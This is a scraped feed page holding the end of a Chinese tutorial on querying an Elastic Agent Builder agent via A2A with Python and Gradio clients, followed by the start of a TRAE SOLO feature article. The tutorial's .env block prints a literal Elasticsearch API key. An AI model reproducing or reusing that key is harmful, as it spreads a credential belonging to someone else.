<span class="hljs-attr">1.  ES_AGENT_URL</span>=http://localhost:<span class="hljs-number">5601</span>/api/agent_builder/a2a
<span class="hljs-attr">2.  ES_API_KEY</span>=WnJwR3RKb0JGQVVCVjdnb29yUkI6RHotbGZBTmJzMDJWUWszbTAtbDVjQQ==
<span class="hljs-attr">3.  AGENT_ID</span>=find_the_cheapest_ticket_from_cn_us

`AI写代码
</code></pre>
<p>我们需要根据自己的配置进行相应的修改。我们可以通过如下的方法来得到你自己的 a2a 地址：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/abd5d265ab814ec6953664ca442e916a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764570674&amp;x-signature=XYpX8y8vN7xf7q4lt%2BqywJi6lpU%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/56443e8c71f246eea4b4308711783ca3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764570674&amp;x-signature=hEgZLXxgSemFHJftsNI3vLpP%2FBw%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc0e999a8b8d452fb3b74e3391639a04~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764570674&amp;x-signature=BE8K6KbwWyH2ImRIN20uffY%2FQ%2BU%3D" alt="" loading="lazy"/></p>
<p>针对我的情况，上面的地址是：</p>
<pre><code class="hljs language-bash" lang="bash">`http://localhost:5601/api/agent_builder/mcp`AI写代码
</code></pre>
<p>很显然，上面的地址是给 MCP 而用的。我们需要把上面的 mcp 换成 a2a，这样它的地址就是：</p>
<pre><code class="hljs language-bash" lang="bash">`http://localhost:5601/api/agent_builder/a2a`AI写代码
</code></pre>
<p>接下来，我们来创建一个用于我们访问 Elasticsearch 的 API key：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5049040eadca4be8bedc50976203c121~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764570674&amp;x-signature=S1zNh%2BYWnH5mm9qQ1F4qPEP4M40%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c6a94446cc3427c9d29292e323b5be1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764570674&amp;x-signature=clorlG1%2FQu4JdpDxLe5TrKjfIYQ%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ddb22a3634746f4905d20ca7584c395~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764570674&amp;x-signature=R2CtvNL%2FapZEjd6BQL%2BOyFC1yjA%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78da2b1a3a9a4ae19095c9c112b66c20~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764570674&amp;x-signature=bC7MGvA2dkY11Lu2kkb9H9VC3LE%3D" alt="" loading="lazy"/></p>
<p>拷贝上面的 key。这样我们就完成了我们的 API key 申请。</p>
<p>另外，我们需要填入我们想要访问的 agent ID，比如上面的 find_the_cheapest_ticket_from_cn_us</p>
<p>接下来，我们需要使用如下的命令来安装所需要的包：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`pip install -r requirements.txt`</span> AI写代码
</code></pre>
<h2 data-id="heading-2">运行代码</h2>
<p>我们的代码非常简单：</p>
<p><strong>access_agents.py</strong></p>
<pre><code class="hljs language-ini" lang="ini">`

1.  import asyncio
2.  from dotenv import load_dotenv
3.  import httpx
4.  import os
5.  from a2a.client import A2ACardResolver
6.  from agent_framework.a2a import A2AAgent

9.  async def main():
10.      load_dotenv()
<span class="hljs-attr">11.      a2a_agent_host</span> = os.getenv(<span class="hljs-string">"ES_AGENT_URL"</span>)
<span class="hljs-attr">12.      a2a_agent_key</span> = os.getenv(<span class="hljs-string">"ES_API_KEY"</span>)
<span class="hljs-attr">13.      agent_id</span> = os.getenv(<span class="hljs-string">"AGENT_ID"</span>)

15.      print(f"Connection to Elastic A2A agent at: {a2a_agent_host}")

<span class="hljs-attr">17.      custom_headers</span> = {<span class="hljs-string">"Authorization"</span>: f<span class="hljs-string">"ApiKey {a2a_agent_key}"</span>}

19.      async with httpx.AsyncClient(<span class="hljs-attr">timeout</span>=<span class="hljs-number">60.0</span>, headers=custom_headers) as http_client:
20.          <span class="hljs-comment"># Resolve the A2A Agent Card</span>
<span class="hljs-attr">21.          resolver</span> = A2ACardResolver(httpx_client=http_client, base_url=a2a_agent_host)
<span class="hljs-attr">22.          agent_card</span> = await resolver.get_agent_card(
<span class="hljs-attr">23.              relative_card_path</span>=f<span class="hljs-string">"/{agent_id}.json"</span>
24.          )
25.          print(f"Found Agent: {agent_card.name} - {agent_card.description}")

27.          <span class="hljs-comment"># Use the Agent</span>
<span class="hljs-attr">28.          agent</span> = A2AAgent(
<span class="hljs-attr">29.              name</span>=agent_card.name,
<span class="hljs-attr">30.              description</span>=agent_card.description,
<span class="hljs-attr">31.              agent_card</span>=agent_card,
<span class="hljs-attr">32.              url</span>=a2a_agent_host,
<span class="hljs-attr">33.              http_client</span>=http_client,
34.          )
<span class="hljs-attr">35.          prompt</span> = input(<span class="hljs-string">"Enter Greeting &gt;&gt;&gt; "</span>)
36.          print("\nSending message to Elastic A2A agent...")
<span class="hljs-attr">37.          response</span> = await agent.run(prompt)
38.          print("\nAgent Response:")
39.          for message in response.messages:
40.              print(message.text)

43.  if <span class="hljs-attr">__name__</span> == <span class="hljs-string">"__main__"</span>:
44.      asyncio.run(main())

`AI写代码!<span class="hljs-section">[]</span>(https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)
</code></pre>
<p>我们运行上面的应用：</p>
<pre><code class="hljs language-go" lang="go"> <span class="hljs-string">`python access_agents.py`</span> AI写代码
</code></pre>

<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`从中国到美国最便宜的机票是多少？出发城市和到达城市是什么？`</span>AI写代码
</code></pre>

<pre><code class="hljs language-markdown" lang="markdown">`

<span class="hljs-bullet">1.</span>  $ pwd
<span class="hljs-bullet">2.</span>  /Users/liuxg/python/ai<span class="hljs-emphasis">_agent_</span>builder
<span class="hljs-bullet">3.</span>  $ ls
<span class="hljs-bullet">4.</span>  README.md        access<span class="hljs-emphasis">_agents.py requirements.txt
5.  $ python access_</span>agents.py 
<span class="hljs-bullet">6.</span>  Connection to Elastic A2A agent at: http://localhost:5601/api/agent<span class="hljs-emphasis">_builder/a2a
7.  Found Agent: Find cheapest price from China to US - Find cheapest price from China to US
8.  Enter Greeting &gt;&gt;&gt; 从中国到美国最便宜的机票是多少？出发城市和到达城市是什么？

10.  Sending message to Elastic A2A agent...

12.  Agent Response:
13.  根据查询结果，从中国到美国最便宜的机票信息如下：

15.  - <span class="hljs-strong">**机票价格**</span>：272.68美元
16.  - <span class="hljs-strong">**出发城市**</span>：广州 (Guangzhou)
17.  - <span class="hljs-strong">**到达城市**</span>：塔尔萨 (Tulsa)

`AI写代码![](<span class="hljs-link">https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png</span>)
</span></code></pre>
<p>很显然，我们得到了我们想要的结果。</p>
<p>我们也可以使用英文来进行提问：</p>
<pre><code class="hljs language-vbnet" lang="vbnet">`What <span class="hljs-built_in">is</span> the cheapest air-ticket price <span class="hljs-keyword">from</span> China <span class="hljs-keyword">to</span> US? What are the origin city <span class="hljs-built_in">and</span> the destination city?`AI写代码
</code></pre>

<pre><code class="hljs language-markdown" lang="markdown">`

<span class="hljs-bullet">1.</span>  $ python access<span class="hljs-emphasis">_agents.py 
2.  Connection to Elastic A2A agent at: http://localhost:5601/api/agent_</span>builder/a2a
<span class="hljs-bullet">3.</span>  Found Agent: Find cheapest price from China to US - Find cheapest price from China to US
<span class="hljs-bullet">4.</span>  Enter Greeting &gt;&gt;&gt; What is the cheapest air-ticket price from China to US? What are the origin city and the destination city?

<span class="hljs-bullet">6.</span>  Sending message to Elastic A2A agent...

<span class="hljs-bullet">8.</span>  Agent Response:
<span class="hljs-bullet">9.</span>  Based on the flight data, the cheapest air-ticket from China to the US is:

<span class="hljs-bullet">11.</span>  - <span class="hljs-strong">**Price**</span>: $272.68
<span class="hljs-bullet">12.</span>  - <span class="hljs-strong">**Origin City**</span>: Guangzhou, China
<span class="hljs-bullet">13.</span>  - <span class="hljs-strong">**Destination City**</span>: Tulsa, USA

`AI写代码![](<span class="hljs-link">https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png</span>)
</code></pre>
<p>如果我们想使用 gradio 来做一个网页，那么我们可以把我们的代码修改为：</p>
<p><strong>access_agents_gradio.py</strong></p>
<pre><code class="hljs language-ini" lang="ini">`

1.  import asyncio
2.  from dotenv import load_dotenv
3.  import httpx
4.  import os
5.  from a2a.client import A2ACardResolver
6.  from agent_framework.a2a import A2AAgent
7.  import gradio as gr

9.  <span class="hljs-comment"># ---------- Global variables ----------</span>
<span class="hljs-attr">10.  a2a_agent_host</span> = None
<span class="hljs-attr">11.  a2a_agent_key</span> = None
<span class="hljs-attr">12.  agent_id</span> = None
<span class="hljs-attr">13.  agent_card</span> = None
<span class="hljs-attr">14.  custom_headers</span> = None

17.  <span class="hljs-comment"># ---------- Initialize everything once ----------</span>
18.  async def init_agent():
19.      global a2a_agent_host, a2a_agent_key, agent_id, agent_card, custom_headers

21.      load_dotenv()
<span class="hljs-attr">22.      a2a_agent_host</span> = os.getenv(<span class="hljs-string">"ES_AGENT_URL"</span>)
<span class="hljs-attr">23.      a2a_agent_key</span> = os.getenv(<span class="hljs-string">"ES_API_KEY"</span>)
<span class="hljs-attr">24.      agent_id</span> = os.getenv(<span class="hljs-string">"AGENT_ID"</span>)

26.      print(f"Connecting to Elastic A2A agent: {a2a_agent_host}")

<span class="hljs-attr">28.      custom_headers</span> = {<span class="hljs-string">"Authorization"</span>: f<span class="hljs-string">"ApiKey {a2a_agent_key}"</span>}

30.      async with httpx.AsyncClient(<span class="hljs-attr">timeout</span>=<span class="hljs-number">60.0</span>, headers=custom_headers) as http_client:
<span class="hljs-attr">31.          resolver</span> = A2ACardResolver(httpx_client=http_client, base_url=a2a_agent_host)
<span class="hljs-attr">32.          agent_card</span> = await resolver.get_agent_card(
<span class="hljs-attr">33.              relative_card_path</span>=f<span class="hljs-string">"/{agent_id}.json"</span>
34.          )
35.          print(f"Loaded Agent Card: {agent_card.name} - {agent_card.description}")

38.  <span class="hljs-comment"># ---------- Function that Gradio will call ----------</span>
39.  async def call_agent(prompt):
40.      async with httpx.AsyncClient(<span class="hljs-attr">timeout</span>=<span class="hljs-number">60.0</span>, headers=custom_headers) as http_client:
<span class="hljs-attr">41.          agent</span> = A2AAgent(
<span class="hljs-attr">42.              name</span>=agent_card.name,
<span class="hljs-attr">43.              description</span>=agent_card.description,
<span class="hljs-attr">44.              agent_card</span>=agent_card,
<span class="hljs-attr">45.              url</span>=a2a_agent_host,
<span class="hljs-attr">46.              http_client</span>=http_client,
47.          )
<span class="hljs-attr">48.          response</span> = await agent.run(prompt)
49.          return "\n".join(<span class="hljs-section">[msg.text for msg in response.messages]</span>)

52.  <span class="hljs-comment"># ---------- Gradio wrapper (sync → async) ----------</span>
53.  def gradio_handler(prompt):
54.      return asyncio.run(call_agent(prompt))

57.  <span class="hljs-comment"># ---------- Launch Gradio UI ----------</span>
58.  async def launch_gradio():
59.      await init_agent()   <span class="hljs-comment"># Load everything before UI starts</span>

<span class="hljs-attr">61.      iface</span> = gr.Interface(
<span class="hljs-attr">62.          fn</span>=gradio_handler,
<span class="hljs-attr">63.          inputs</span>=gr.Textbox(lines=<span class="hljs-number">2</span>, label=<span class="hljs-string">"Enter Greeting"</span>),
<span class="hljs-attr">64.          outputs</span>=gr.Textbox(label=<span class="hljs-string">"Agent Response"</span>),
<span class="hljs-attr">65.          title</span>=<span class="hljs-string">"Elastic A2A Agent Web UI"</span>
66.      )
67.      iface.launch()

70.  if <span class="hljs-attr">__name__</span> == <span class="hljs-string">"__main__"</span>:
71.      asyncio.run(launch_gradio())

`AI写代码!<span class="hljs-section">[]</span>(https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)收起代码块!<span class="hljs-section">[]</span>(https://csdnimg.cn/release/blogv2/dist/pc/img/arrowup-line-top-White.png)
</code></pre>

<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`python access_agents_gradio.py`</span>AI写代码
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51ca5a96ecf9422b908b15e16a934998~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764570674&amp;x-signature=vXKYqhpqK%2BY05LKM%2B75lgSYbTGk%3D" alt="" loading="lazy"/></p>
<p>祝大家使用 AI agent builder 愉快！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TRAE SOLO 新版本 · 这些功能让开发效率翻倍]]></title>    <link>https://juejin.cn/post/7575910333400383542</link>    <guid>https://juejin.cn/post/7575910333400383542</guid>    <pubDate>2025-11-24T06:59:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575910333400383542" data-draft-id="7575884229525553188" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TRAE SOLO 新版本 · 这些功能让开发效率翻倍"/> <meta itemprop="keywords" content="Trae"/> <meta itemprop="datePublished" content="2025-11-24T06:59:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="TRAE_ai"/> <meta itemprop="url" content="https://juejin.cn/user/3048259110571032"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TRAE SOLO 新版本 · 这些功能让开发效率翻倍
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3048259110571032/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    TRAE_ai
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:59:53.000Z" title="Mon Nov 24 2025 06:59:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b37055bed386430ebb42b836c2dfc5c4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=GLMBnidU%2BVTXPX605NnLZibH2pw%3D" alt="" loading="lazy"/></p>
<p>在真实开发中，我们面临的挑战往往不是“能不能实现”，而是“如何更快更好地实现”：如何避免重复造轮子？如何在多任务间保持专注？如何沉淀开发经验而不是让知识随项目消失？如何打造真正适合自己的开发环境？</p>
<p>TRAE SOLO 正式版的全新升级，正是为了解决这些真实痛点。从<strong>跨项目代码复用</strong>到<strong>多任务并行管理</strong>，从<strong>智能体协作沉淀最佳实践</strong>到<strong>自定义工作台布局</strong>，每一个功能都源自对真实开发场景的深度洞察。</p>
<p>接下来，让我们通过具体案例，看看这些功能如何帮你建立更高效的开发工作流。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b5ba99a03424ec3bb9d6ffd380656a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=H7Luzigpv82yIbCmLUxNeW%2B8zes%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0"><strong>SOLO Coder · 轻松应对复杂项目开发</strong></h2>
<p>在实际开发中，我们经常需要在不同项目间复用代码，或是在现有项目中快速实现复杂功能。以下两个案例展示了 SOLO Coder 如何帮助开发者高效完成这些任务。</p>
<h3 data-id="heading-1"><strong>Case 1：跨项目复用功能模块</strong></h3>
<p><strong>需求：</strong> 复用其它项目中已经实现过的功能模块</p>
<p><strong>用户输入：</strong> 在另一个工程里实现过 Changelog 模块（路径是：/Users/bytedance/work/workspace_h5/changelog-template），我想复用到当前这个网站上来，请执行</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b1f73acd8afa407b94bf1eb6e672b9df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=hOk1EUTT7I2yGhVQg%2BuUzmut23I%3D" alt="" loading="lazy"/></p>
<p><strong>输出结果：</strong> 已经成功将 changelog 模块复用到当前首页中。以下是完成的工作总结：</p>
<ul>
<li>
<p><strong>复用的组件</strong></p>
<p>Accordion 组件 （ <em><strong>src/components/Accordion.tsx</strong></em> ）：从原 changelog 模块复制并适配了 Radix UI 的手风琴组件</p>
<p>Changelog 组件 （ <em><strong>src/components/Changelog.tsx</strong></em> ）：创建了新的 changelog 展示组件，支持可配置的显示数量和图片开关</p>
</li>
<li>
<p><strong>首页集成</strong></p>
<p>在首页添加了“最新更新”部分</p>
<p>展示最新的 2 个更新日志</p>
<p>包含图片、版本号、标签、功能列表和问题修复等完整信息</p>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2969b416fb7143788efa769deea6530e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=DsJNHEBa%2BChs0pF0laFDZsbT1eY%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-2"><strong>Case 2：快速实现复杂交互功能</strong></h3>
<p><strong>场景：</strong> 在首页新增一个复杂功能</p>
<p><strong>用户输入：</strong> 在这个网站的首页里，增加一个让用户点击试用的 playground 界面，让用户在不登录的情况下也能体验这个网站的功能</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0878635ad0ed44deb6dffcf689767f58~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=CEB0BUjdGH8Ss6amjFegNthIHuU%3D" alt="" loading="lazy"/></p>
<p><strong>输出结果：</strong> Playground 组件已成功创建并集成！</p>
<ul>
<li>
<p><strong>智能步骤引导</strong></p>
<p>📤 上传文件 → 👁️ 预览文件 → 🧠 AI 分析 → 📤 分享文件</p>
<p>可视化步骤指示器，清晰展示当前进度</p>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5c8f22bee6ed489293fabbc8f4a0a54b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=TL2iVICMzfHrHJ1srIz%2BN%2BEnFwU%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e3e3d5641d6342aa98ac3170b68642b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=0wfnCZpBX6l%2FdkITLen07AIe6ZU%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3"><strong>Multi-Tasks · 侧边栏支持管理多任务</strong></h2>
<p>当面对多个并行开发任务时，Multi-Tasks 能力让你能够同时推进不同的工作流，无需在任务间来回切换上下文。</p>
<h3 data-id="heading-4"><strong>Case 1：并行重构多个业务模块</strong></h3>
<p><strong>场景：</strong> 同时重构不同的业务模块</p>
<p><strong>用户输入：</strong></p>
<ul>
<li>
<p>Query 1：重构下这个网站的首页，基于这个组件库 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmagicui.design%2Fdocs%2Fcomponents" target="_blank" title="https://magicui.design/docs/components" ref="nofollow noopener noreferrer">magicui.design/docs/compon…</a> 提供的一些组件让整个网站看起来更加的 Fancy</p>
</li>
<li>
<p>Query 2：定价页的 UI 也基于 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmagicui.design%2Fdocs%2Fcomponents%25E9%2587%258D%25E6%259E%2584%25EF%25BC%258C%25E8%25AE%25A9%25E9%25A1%25B5%25E9%259D%25A2%25E6%259B%25B4%25E5%258A%25A0" target="_blank" title="https://magicui.design/docs/components%E9%87%8D%E6%9E%84%EF%BC%8C%E8%AE%A9%E9%A1%B5%E9%9D%A2%E6%9B%B4%E5%8A%A0" ref="nofollow noopener noreferrer">magicui.design/docs/compon…</a> Fancy</p>
</li>
</ul>
<p><strong>输出结果：</strong> 已经成功将你的网站首页重构为更加 Fancy 的 Magic UI 风格。以下是重构的主要成果：</p>
<ul>
<li>新增的 Magic UI 风格组件：AnimatedGridPattern - 动态网格背景效果、OrbitingCircles - 轨道圆圈动画组件、BentoGrid &amp; BentoCard - 现代化的网格布局卡片、AnimatedList - 动态列表动画、ActivityNotifications - 实时活动通知展示</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d729c9fca211442aab854a75193ebb63~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=PCTOeO86E%2Bp9xiOB1rcTYg5PjP0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5"><strong>Case 2：批量修复多个 Bug</strong></h3>
<p><strong>场景：</strong> 同时修复 QA 同学提过来的多个 Bug</p>
<p><strong>用户输入：</strong></p>
<ul>
<li>
<p>Query 1：Fix Bug 定价页面里的价格从 28 搞成了 18 的问题</p>
</li>
<li>
<p>Query 2：Fix Bug 首页「立即开始」点击后报错的</p>
</li>
</ul>
